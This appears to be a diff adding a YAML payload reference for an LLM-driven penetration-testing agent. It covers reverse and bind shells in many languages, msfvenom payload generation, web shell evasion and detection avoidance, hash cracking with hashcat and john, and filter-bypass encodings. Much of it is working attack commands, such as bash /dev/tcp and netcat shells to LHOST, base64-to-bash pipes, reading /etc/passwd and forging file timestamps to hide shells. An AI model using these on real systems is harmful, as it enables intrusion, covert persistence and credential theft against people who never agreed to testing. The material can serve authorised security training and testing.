@@ -1,0 +1,556 @@
+id: reverse-shells-and-payloads
+name: Reverse Shells, Web Shells, and Hash Identification
+version: "1.0"
+category: payloads
+tags:
+  - reverse_shell
+  - bind_shell
+  - web_shell
+  - hash
+  - msfvenom
+  - payloads
+  - bash
+  - python
+  - php
+  - powershell
+  - java
+  - netcat
+  - shell_stabilization
+  - hash_identification
+  - encoding
+last_updated: "2026-03-26"
+description: >
+  Reverse/bind shell methodology for 11 languages, web shell deployment strategies,
+  shell stabilization techniques, hash identification patterns with hashcat/john modes,
+  msfvenom quick-reference, and common encoding techniques. Focuses on methodology,
+  selection criteria, and identification — the LLM assembles payloads from structural
+  knowledge.
+
+sections:
+  # -----------------------------------------------------------------------
+  # REVERSE SHELLS — methodology and selection
+  # -----------------------------------------------------------------------
+  - title: "Reverse Shell Selection Guide"
+    content: |
+      ## When to Use Which Language
+
+      Choose the reverse shell language based on what is available on the target.
+      Check availability: `which python3 bash nc perl ruby php node lua`
+
+      | Priority | Language   | Why                                        | Stability |
+      |----------|------------|--------------------------------------------|-----------|
+      | 1        | Bash       | Almost always available on Linux            | High      |
+      | 2        | Python 3   | Available on most Linux, full PTY possible  | Highest   |
+      | 3        | PHP        | Web servers, available via web shell first  | Medium    |
+      | 4        | Perl       | Legacy systems, often pre-installed         | Medium    |
+      | 5        | PowerShell | Windows default, .NET sockets               | High      |
+      | 6        | Ruby       | Less common but stable sockets              | Medium    |
+      | 7        | Netcat     | Direct if nc -e available; mkfifo fallback  | Medium    |
+      | 8        | Java       | Enterprise environments with JRE            | Medium    |
+      | 9        | Node.js    | JS-heavy environments                       | Medium    |
+      | 10       | Golang     | Rare but very stable when compiled          | High      |
+      | 11       | Lua        | Embedded systems, game servers              | Low       |
+
+      ## Delivery Methods
+
+      - Via command injection: pipe directly through the vulnerable parameter
+      - Via file upload: upload a script file, then execute/include it
+      - Via web shell: use a simple web shell first, then upgrade to reverse shell
+      - Via SSTI: inject the shell command through the template engine RCE
+      - Via SQLi: write to file (MySQL INTO OUTFILE, SQLite ATTACH DATABASE)
+
+  - title: "Bash Reverse Shell Methodology"
+    content: |
+      ## Variant 1: /dev/tcp (most common)
+
+      Structure: redirect stdin/stdout/stderr to a TCP connection via bash built-in
+      /dev/tcp pseudo-device. Requires bash (not sh/dash).
+
+      Pattern: `bash -i >& /dev/tcp/LHOST/LPORT 0>&1`
+
+      - `-i` = interactive mode (prompt)
+      - `>&` = redirect stdout and stderr
+      - `0>&1` = redirect stdin to same connection
+
+      If bash is not at /bin/bash, use: `bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'`
+
+      ## Variant 2: mkfifo named pipe
+
+      Structure: create a named pipe, connect to attacker via nc, pipe through bash.
+      Works even when /dev/tcp is disabled (non-bash shells).
+
+      Pattern: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc LHOST LPORT > /tmp/f`
+
+      ## Variant 3: exec file descriptor
+
+      Structure: open a bidirectional socket on fd 5, redirect I/O through it.
+
+      Pattern: `exec 5<>/dev/tcp/LHOST/LPORT; cat <&5 | while read line; do $line 2>&5 >&5; done`
+
+      ## Notes
+      - Always URL-encode `&` as `%26` when injecting through HTTP parameters
+      - Base64-encode the full payload and pipe through `bash -c` to avoid bad characters
+      - If spaces are filtered: use `${IFS}` as separator
+
+  - title: "Python Reverse Shell Methodology"
+    content: |
+      ## Structure
+
+      Python reverse shell uses the `socket` module to create a TCP connection,
+      then uses `subprocess.Popen` (or `os.dup2`) to redirect stdin/stdout/stderr
+      to the socket file descriptor.
+
+      Key components:
+      1. `import socket, subprocess, os`
+      2. Create socket: `s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)`
+      3. Connect: `s.connect(("LHOST", LPORT))`
+      4. Redirect file descriptors: `os.dup2(s.fileno(), 0/1/2)`
+      5. Spawn shell: `subprocess.call(["/bin/bash", "-i"])`
+
+      ## One-liner delivery
+
+      Wrap in `python3 -c '...'` for command injection delivery.
+      For complex payloads, base64-encode and pipe: `echo BASE64 | base64 -d | python3`
+
+      ## Full PTY variant (most stable)
+
+      Use the `pty` module: `import pty; pty.spawn("/bin/bash")` after socket setup.
+      This gives a proper TTY which supports tab completion, su, sudo, and Ctrl+C.
+
+      ## Windows variant
+
+      Replace `/bin/bash` with `cmd.exe`. Use `subprocess.call(["cmd.exe"])`.
+      PowerShell variant: `subprocess.call(["powershell.exe", "-nop", "-ep", "bypass"])`.
+
+  - title: "PHP Reverse Shell Methodology"
+    content: |
+      ## Structure
+
+      PHP reverse shell uses `fsockopen()` to create a TCP connection, then
+      opens a process via `proc_open()` or `popen()` and pipes I/O through the socket.
+
+      Key components:
+      1. Create socket: `$sock = fsockopen("LHOST", LPORT)`
+      2. Open process: `$proc = proc_open("/bin/bash", $descriptors, $pipes)`
+      3. Loop: read from socket, write to process stdin; read from process stdout, write to socket
+
+      ## Alternative functions (when fsockopen is disabled)
+
+      - `exec()` — execute command, return last line
+      - `shell_exec()` — execute command, return full output
+      - `passthru()` — execute and pass raw output
+      - `popen()` — open process with pipe
+      - `proc_open()` — full bidirectional process control (preferred)
+
+      Check `disable_functions` in phpinfo() to see what's available.
+
+      ## Delivery
+
+      - Upload as .php file (see file upload section)
+      - Inject via LFI + log poisoning (inject PHP tags in User-Agent)
+      - Execute via `php -r '...'` if command injection is available
+
+      ## PentestMonkey PHP reverse shell
+
+      The de facto standard. Full-featured with process spawning, signal
+      handling, and daemon mode. Available at: pentestmonkey.net/tools/php-reverse-shell
+
+  - title: "PowerShell Reverse Shell Methodology"
+    content: |
+      ## Structure (TCPClient)
+
+      PowerShell uses .NET's `System.Net.Sockets.TCPClient` to create a TCP
+      connection, gets a NetworkStream, wraps it in a StreamReader/StreamWriter,
+      and loops: read command → execute via `Invoke-Expression` → write output.
+
+      Key components:
+      1. `$client = New-Object System.Net.Sockets.TCPClient("LHOST", LPORT)`
+      2. `$stream = $client.GetStream()`
+      3. Read/write loop with `[System.IO.StreamReader]` and `[System.IO.StreamWriter]`
+      4. Execute: `Invoke-Expression $command 2>&1`
+
+      ## Encoded command delivery
+
+      For injection: base64-encode the UTF-16LE PowerShell script, deliver via:
+      `powershell -nop -enc BASE64_UTF16LE`
+
+      Encoding: `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))`
+
+      ## ConPTY variant (Windows 10+)
+
+      Uses `CreatePseudoConsole` API for a full interactive PTY. More complex
+      but provides proper terminal. Invoke-ConPTYShell from Nishang toolkit.
+
+      ## Constrained Language Mode bypass
+
+      If PowerShell is in Constrained Language Mode:
+      - Use `Add-Type` with inline C# to call Win32 APIs directly
+      - Use `mshta.exe`, `wscript.exe`, or `cscript.exe` as execution proxy
+      - Use `InstallUtil.exe` or `MSBuild.exe` for .NET assembly execution
+
+  - title: "Other Language Reverse Shells"
+    content: |
+      ## Perl
+
+      Structure: uses `Socket` module, `connect()`, then `open(STDIN/STDOUT/STDERR, ">&S")`
+      to redirect I/O, followed by `exec("/bin/bash -i")`.
+      Delivery: `perl -e '...'` or `perl -MIO -e '...'` (IO::Socket shorthand).
+
+      ## Ruby
+
+      Structure: uses `TCPSocket.new(LHOST, LPORT)`, then redirects $stdin/$stdout/$stderr
+      via `reopen()`, followed by `exec("/bin/bash -i")`.
+      Delivery: `ruby -rsocket -e '...'`
+
+      ## Java
+
+      Structure: uses `Runtime.getRuntime().exec()` with a String array containing
+      `/bin/bash -c bash -i >& /dev/tcp/LHOST/LPORT 0>&1`. Must use String array
+      form (not single string) for proper argument parsing.
+      Alternative: `ProcessBuilder` with redirected I/O streams.
+
+      ## Node.js
+
+      Structure: uses `child_process` module's `spawn("/bin/bash")` and pipes
+      stdin/stdout/stderr through `net.Socket` connected to LHOST:LPORT.
+      Delivery: `node -e '...'` or `require('child_process')` in a .js file.
+
+      ## Golang
+
+      Structure: compiled binary with `net.Dial("tcp", "LHOST:LPORT")` and
+      `exec.Command("/bin/bash")` with Stdin/Stdout/Stderr set to the connection.
+      Must be cross-compiled: `GOOS=linux GOARCH=amd64 go build`
+
+      ## Lua
+
+      Structure: uses `os.execute()` piped through a bash reverse shell, or
+      `io.popen()` for output capture. Limited — typically wraps a bash payload.
+      Delivery: `lua -e '...'` or via Lua-enabled applications (Redis EVAL, Nmap NSE).
+
+      ## Netcat variants
+
+      - With `-e` flag: `nc -e /bin/bash LHOST LPORT` (traditional nc, not OpenBSD)
+      - Without `-e` (OpenBSD): use mkfifo named pipe method (see Bash section)
+      - Ncat (nmap's nc): `ncat LHOST LPORT -e /bin/bash`
+      - Busybox: `busybox nc LHOST LPORT -e /bin/bash`
+
+  # -----------------------------------------------------------------------
+  # BIND SHELLS
+  # -----------------------------------------------------------------------
+  - title: "Bind Shell Methodology"
+    content: |
+      ## When to Use Bind Shells
+
+      Use bind shells when:
+      - Attacker cannot receive incoming connections (NAT, firewall)
+      - Target has a public IP or is on the same network
+      - Egress filtering blocks outbound connections from target
+
+      ## Structure (any language)
+
+      1. Create a listening socket on the target: `bind()` to 0.0.0.0:PORT, `listen()`
+      2. `accept()` incoming connection
+      3. Redirect stdin/stdout/stderr to the accepted socket
+      4. Spawn shell (`/bin/bash` or `cmd.exe`)
+
+      ## Languages
+
+      - **Bash**: `nc -lvp PORT -e /bin/bash` (with -e) or mkfifo + nc -lvp variant
+      - **Python**: `socket.bind(("0.0.0.0", PORT))` → `socket.listen()` → `accept()` → `dup2()` → `subprocess.call()`
+      - **PHP**: `$sock = socket_create()` → `socket_bind()` → `socket_listen()` → `socket_accept()` → pipe to shell
+      - **Netcat**: `nc -lvp PORT -e /bin/bash` or `ncat -lvp PORT -e /bin/bash`
+
+      ## Risks
+
+      - Bind shells leave an open port visible to network scans
+      - Firewalls may block inbound connections to non-standard ports
+      - Other attackers can connect to your bind shell
+      - Prefer reverse shells when possible
+
+  # -----------------------------------------------------------------------
+  # MSFVENOM
+  # -----------------------------------------------------------------------
+  - title: "Msfvenom Quick Reference"
+    content: |
+      ## Common Payload Generation Patterns
+
+      General syntax: `msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT -o OUTPUT`
+
+      ### Windows Payloads
+
+      | Format | Payload                                    | Flag             | Use Case            |
+      |--------|--------------------------------------------|------------------|---------------------|
+      | EXE    | windows/x64/meterpreter/reverse_tcp        | -f exe           | Standard dropper    |
+      | DLL    | windows/x64/meterpreter/reverse_tcp        | -f dll           | DLL hijacking       |
+      | PS1    | windows/x64/meterpreter/reverse_tcp        | -f psh           | PowerShell delivery |
+      | ASPX   | windows/x64/meterpreter/reverse_tcp        | -f aspx          | IIS web shell       |
+      | EXE    | windows/x64/shell_reverse_tcp              | -f exe           | Stageless (no MSF)  |
+      | HTA    | windows/x64/meterpreter/reverse_tcp        | -f hta-psh       | Phishing delivery   |
+
+      ### Linux Payloads
+
+      | Format | Payload                                    | Flag             | Use Case            |
+      |--------|--------------------------------------------|------------------|---------------------|
+      | ELF    | linux/x64/meterpreter/reverse_tcp          | -f elf           | Standard dropper    |
+      | ELF    | linux/x64/shell_reverse_tcp                | -f elf           | Stageless (no MSF)  |
+      | PY     | python/meterpreter/reverse_tcp             | -f raw           | Python delivery     |
+
+      ### Web Payloads
+
+      | Format | Payload                                    | Flag             | Use Case            |
+      |--------|--------------------------------------------|------------------|---------------------|
+      | PHP    | php/meterpreter/reverse_tcp                | -f raw           | PHP upload          |
+      | WAR    | java/meterpreter/reverse_tcp               | -f war           | Tomcat manager      |
+      | JSP    | java/jsp_shell_reverse_tcp                 | -f raw           | JSP upload          |
+
+      ### Encoders (AV evasion — limited effectiveness)
+
+      - `-e x86/shikata_ga_nai -i 5` — polymorphic XOR encoder, 5 iterations
+      - `-e x64/xor_dynamic` — 64-bit XOR
+      - `--encrypt aes256 --encrypt-key KEY` — AES encryption
+
+      ### Staged vs Stageless
+
+      - **Staged** (`/meterpreter/reverse_tcp`): smaller, requires MSF handler
+      - **Stageless** (`/meterpreter_reverse_tcp`): larger, standalone, better for unstable connections
+
+      ### Handler setup
+
+      ```
+      msfconsole -q
+      use exploit/multi/handler
+      set PAYLOAD windows/x64/meterpreter/reverse_tcp
+      set LHOST 0.0.0.0
+      set LPORT 4444
+      exploit -j
+      ```
+
+  # -----------------------------------------------------------------------
+  # WEB SHELLS
+  # -----------------------------------------------------------------------
+  - title: "Web Shell Deployment Strategy"
+    content: |
+      ## Purpose
+
+      Web shells provide command execution through HTTP requests. They are used as:
+      1. Initial foothold after file upload or file write vulnerability
+      2. Stepping stone to reverse shell (more stable)
+      3. Persistent access when reverse shells die
+
+      ## Language Selection
+
+      | Server      | Language | File Extension            |
+      |-------------|----------|---------------------------|
+      | Apache/Nginx| PHP      | .php, .php5, .phtml, .phar|
+      | IIS         | ASP/ASPX | .asp, .aspx, .ashx       |
+      | Tomcat/JBoss| JSP      | .jsp, .jspx               |
+      | Python WSGI | Python   | .py (CGI mode)            |
+
+      ## PHP Web Shell Architecture
+
+      Simplest form: one-liner that takes a GET/POST parameter and passes it to
+      a system execution function (system, exec, shell_exec, passthru, popen).
+
+      More advanced: include file manager, upload capability, database client,
+      and reverse shell launcher. p0wny-shell, weevely, and b374k are well-known
+      full-featured PHP web shells.
+
+      ## ASP/ASPX Web Shell Architecture
+
+      Uses `Process.Start()` to launch cmd.exe with arguments from request parameter.
+      Or `CreateObject("WScript.Shell").Exec()` for classic ASP.
+
+      ## JSP Web Shell Architecture
+
+      Uses `Runtime.getRuntime().exec()` with the command from request parameter.
+      Must handle InputStream to capture output.
+
+      ## Evasion Techniques
+
+      - Obfuscate function names: `$f = "sys"."tem"; $f($cmd);`
+      - Use variable functions: `$_GET[0]($_GET[1])` (function name as parameter)
+      - Base64 decode at runtime: `eval(base64_decode($input))`
+      - Use .htaccess to execute .jpg as PHP: `AddType application/x-httpd-php .jpg`
+      - Hide in image EXIF metadata (polyglot)
+      - Embed in legitimate files (append to existing PHP)
+
+      ## Detection Avoidance
+
+      - Use POST (not GET) to avoid access log exposure
+      - Use custom HTTP headers instead of parameters
+      - Add authentication to the web shell (password check)
+      - Use HTTPS to avoid network inspection
+      - Timestamp the file to match surrounding files: `touch -r reference.php shell.php`
+
+  # -----------------------------------------------------------------------
+  # SHELL STABILIZATION
+  # -----------------------------------------------------------------------
+  - title: "Shell Stabilization Techniques"
+    content: |
+      ## Why Stabilize
+
+      Raw reverse shells lack:
+      - Tab completion
+      - Arrow key history
+      - Ability to run `su`, `sudo`, `ssh` (require TTY)
+      - Ctrl+C support (kills the shell instead of the command)
+      - Proper terminal dimensions
+
+      ## Method 1: Python PTY (most common)
+
+      Step-by-step:
+      1. In the reverse shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+      2. Press Ctrl+Z to background the shell
+      3. In your terminal: `stty raw -echo; fg`
+      4. Press Enter twice
+      5. In the shell: `export TERM=xterm-256color`
+      6. Set proper dimensions: `stty rows 40 cols 160` (match your terminal)
+
+      ## Method 2: socat full TTY (best quality)
+
+      On attacker: `socat file:$(tty),raw,echo=0 tcp-listen:LPORT`
+      On target: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT`
+
+      Requires socat on both sides. Transfer a static binary if needed:
+      `wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat`
+
+      ## Method 3: rlwrap (attacker-side only)
+
+      Wrap your listener: `rlwrap nc -lvnp LPORT`
+      Provides readline (arrow keys, history) without target-side changes.
+      Does NOT provide a TTY — `su`/`sudo` still won't work.
+
+      ## Method 4: script command
+
+      If python is not available: `script -qc /bin/bash /dev/null`
+      Then Ctrl+Z → `stty raw -echo; fg` as above.
+
+      ## Terminal size
+
+      Check your terminal size: `stty size` (e.g., `40 160`)
+      Set in the shell: `stty rows 40 cols 160`
+      Also: `export SHELL=bash` and `export TERM=xterm-256color`
+
+  # -----------------------------------------------------------------------
+  # HASH IDENTIFICATION
+  # -----------------------------------------------------------------------
+  - title: "Hash Identification Patterns"
+    content: |
+      ## Identification by Format
+
+      | Hash Type          | Length | Pattern                      | Example Prefix        | Hashcat | John Format       |
+      |--------------------|--------|------------------------------|-----------------------|---------|-------------------|
+      | MD5                | 32     | `^[a-f0-9]{32}$`            | `5f4dcc3b5aa765d6...` | 0       | raw-md5           |
+      | SHA1               | 40     | `^[a-f0-9]{40}$`            | `5baa61e4c9b93f3f...` | 100     | raw-sha1          |
+      | SHA256             | 64     | `^[a-f0-9]{64}$`            | `5e884898da280471...` | 1400    | raw-sha256        |
+      | SHA512             | 128    | `^[a-f0-9]{128}$`           | `b109f3bbbc244eb8...` | 1700    | raw-sha512        |
+      | NTLM               | 32     | `^[a-fA-F0-9]{32}$`         | `32ED87BDB5FDC5E9...` | 1000    | nt                |
+      | NTLMv2             | varies | `USER::DOMAIN:challenge:...` | `admin::N46iSNekpT...`| 5600    | netntlmv2         |
+      | bcrypt             | 60     | `^\$2[aby]?\$\d{2}\$`       | `$2b$12$...`          | 3200    | bcrypt            |
+      | scrypt             | varies | `^SCRYPT:\d+:\d+:\d+:`      | `SCRYPT:1024:1:...`   | 8900    | —                 |
+      | Argon2             | varies | `^\$argon2(i|d|id)\$`        | `$argon2id$v=19$...`  | 32600   | —                 |
+      | DES crypt          | 13     | `^[a-zA-Z0-9./]{13}$`       | `aWZiZjR1WTJyaw`      | 1500    | descrypt          |
+      | MySQL 4.1+         | 41     | `^\*[A-F0-9]{40}$`          | `*6BB4837EB74329105...`| 300    | mysql-sha1        |
+      | PostgreSQL MD5     | 35     | `^md5[a-f0-9]{32}$`         | `md53175bce1d3201d1...`| 12      | —                 |
+      | PBKDF2-SHA256      | varies | `^pbkdf2_sha256\$`           | `pbkdf2_sha256$36...` | 10000   | —                 |
+      | PBKDF2-SHA1        | varies | `^PBKDF2\$`                  | `PBKDF2$sha1$10000...`| 12000   | —                 |
+      | WordPress (phpass) | 34     | `^\$P\$[a-zA-Z0-9./]{31}$`  | `$P$B...`             | 400     | phpass            |
+      | Django PBKDF2      | varies | `^pbkdf2_sha256\$\d+\$`     | `pbkdf2_sha256$260...`| 10000   | django            |
+      | Kerberos TGS       | varies | `^\$krb5tgs\$23\$`           | `$krb5tgs$23$*...`    | 13100   | krb5tgs           |
+      | Kerberos AS-REP    | varies | `^\$krb5asrep\$23\$`         | `$krb5asrep$23$...`   | 18200   | krb5asrep         |
+      | MSSQL 2012+        | varies | `^0x0200`                    | `0x0200...`           | 1731    | mssql12           |
+      | Oracle 11g+        | varies | `^S:`                        | `S:8F2D65FB5547...`   | 112     | oracle11          |
+      | Apache MD5         | varies | `^\$apr1\$`                  | `$apr1$71850310$...`  | 1600    | md5crypt          |
+      | Linux SHA512 crypt | varies | `^\$6\$`                     | `$6$rounds=5000$...`  | 1800    | sha512crypt       |
+      | Linux SHA256 crypt | varies | `^\$5\$`                     | `$5$rounds=5000$...`  | 7400    | sha256crypt       |
+
+      ## Quick Identification Decision Tree
+
+      1. Starts with `$2b$` or `$2a$`? → **bcrypt** (hashcat 3200)
+      2. Starts with `$argon2`? → **Argon2** (hashcat 32600)
+      3. Starts with `$6$`? → **SHA512 crypt** (hashcat 1800)
+      4. Starts with `$5$`? → **SHA256 crypt** (hashcat 7400)
+      5. Starts with `$P$`? → **WordPress phpass** (hashcat 400)
+      6. Starts with `$apr1$`? → **Apache MD5** (hashcat 1600)
+      7. Starts with `$krb5tgs$`? → **Kerberos TGS** (hashcat 13100)
+      8. Starts with `$krb5asrep$`? → **Kerberos AS-REP** (hashcat 18200)
+      9. Starts with `*` + 40 hex? → **MySQL 4.1+** (hashcat 300)
+      10. Starts with `md5` + 32 hex? → **PostgreSQL MD5** (hashcat 12)
+      11. Starts with `pbkdf2_sha256$`? → **Django/PBKDF2** (hashcat 10000)
+      12. 32 hex chars, all uppercase? → likely **NTLM** (hashcat 1000)
+      13. 32 hex chars, all lowercase? → likely **MD5** (hashcat 0)
+      14. 40 hex chars? → likely **SHA1** (hashcat 100)
+      15. 64 hex chars? → likely **SHA256** (hashcat 1400)
+      16. 128 hex chars? → likely **SHA512** (hashcat 1700)
+      17. 13 alphanumeric chars? → likely **DES crypt** (hashcat 1500)
+
+      ## Cracking Methodology
+
+      1. Identify hash type using patterns above
+      2. Start with wordlist attack: `hashcat -m MODE hash.txt rockyou.txt`
+      3. Add rules: `hashcat -m MODE hash.txt rockyou.txt -r best64.rule`
+      4. Try combinator: `hashcat -m MODE hash.txt -a 1 dict1.txt dict2.txt`
+      5. Mask attack for patterns: `hashcat -m MODE hash.txt -a 3 ?u?l?l?l?d?d?d?d`
+         Common masks:
+         - `?u?l?l?l?l?l?d?d` — Uppercase + lowercase + 2 digits (Password12)
+         - `?u?l?l?l?l?l?d?d?s` — Above + special char (Password12!)
+         - `?d?d?d?d?d?d` — 6-digit PIN
+
+      ## John the Ripper Equivalents
+
+      - Wordlist: `john --wordlist=rockyou.txt --format=FORMAT hash.txt`
+      - Rules: `john --wordlist=rockyou.txt --rules=best64 --format=FORMAT hash.txt`
+      - Show cracked: `john --show --format=FORMAT hash.txt`
+
+  # -----------------------------------------------------------------------
+  # ENCODING TECHNIQUES
+  # -----------------------------------------------------------------------
+  - title: "Common Encoding Techniques"
+    content: |
+      ## Base64
+
+      Encoding (Linux): `echo -n 'payload' | base64`
+      Decoding (Linux): `echo 'BASE64' | base64 -d`
+      Decoding + execute: `echo 'BASE64' | base64 -d | bash`
+
+      PowerShell encoding (UTF-16LE required):
+      ```powershell
+      $cmd = 'IEX(command here)'
+      [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+      ```
+      Execute: `powershell -nop -enc BASE64_STRING`
+
+      Python: `import base64; base64.b64encode(b'payload')`
+
+      ## URL Encoding
+
+      Standard: space → `%20`, `<` → `%3C`, `>` → `%3E`, `"` → `%22`, `'` → `%27`
+      Double encoding: `%` → `%25` first, so `<` → `%253C`
+      Use double encoding to bypass WAF/filter that decodes once.
+
+      Python: `from urllib.parse import quote; quote(payload, safe='')`
+      Bash: `python3 -c "from urllib.parse import quote; print(quote('PAYLOAD', safe=''))"`
+
+      ## Hex Encoding
+
+      Bash: `echo -n 'payload' | xxd -p`
+      SQL: `SELECT 0x61646D696E` (= 'admin')
+      Python: `'payload'.encode().hex()`
+      JavaScript: `'\x3cscript\x3e'` or `String.fromCharCode(60,115,99,...)`
+
+      ## Unicode Encoding
+
+      JavaScript: `\u003cscript\u003e`
+      HTML entities: `&#60;script&#62;` or `&#x3C;script&#x3E;`
+      UTF-8 overlong encoding: `%C0%BC` for `<` (bypasses naive filters)
+
+      ## Shell-specific Encoding
+
+      - Avoid spaces: `${IFS}` (Internal Field Separator), `{cmd,arg1,arg2}`, `%09` (tab)
+      - Avoid keywords: `c'a't /etc/passwd`, `c"a"t /etc/passwd`, `c\at /etc/passwd`
+      - Hex in bash: `$'\x63\x61\x74'` (= `cat`)
+      - Octal in bash: `$'\143\141\164'` (= `cat`)
+      - Variable concatenation: `a=ca;b=t;$a$b /etc/passwd`
+      - Wildcard: `/???/??t /???/??????` (= `cat /etc/passwd` on most systems)
+      - Base64 pipe: `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash`
+      - Rev: `echo 'dwssap/cte/ tac' | rev | bash`
